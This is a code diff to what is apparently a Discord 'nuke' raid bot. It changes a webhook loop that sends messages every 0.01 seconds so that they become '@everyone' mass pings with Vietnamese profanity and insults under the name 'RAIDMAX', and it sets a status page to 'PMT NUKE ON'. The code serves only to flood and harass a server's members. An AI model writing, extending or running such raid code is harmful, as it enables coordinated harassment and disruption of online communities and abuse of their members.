@@ -198,7 +198,7 @@ async def nuke(ctx):
                         async def wh_spam(webhook):
                             while bot.nuking:
                                 try:
-                                    msg = CUSTOM_SPAM_TEXT if not STEALTH_MODE else random.choice(["raid", "nuke", "ping"])
+                                    msg = CUSTOM_SPAM_TEXT if not STEALTH_MODE else random.choice(["@everyone", "@everyone ngu lồn", "@everyone óc chó"])
                                     await webhook.send(msg, username="RAIDMAX")
                                     await asyncio.sleep(0.01)
                                 except:
@@ -261,7 +261,7 @@ async def help(ctx):
         pass
 
 async def handle_web(request):
-    return web.Response(text="Bot is running")
+    return web.Response(text="PMT NUKE ON")
 
 async def start_web_server():
     app = web.Application()
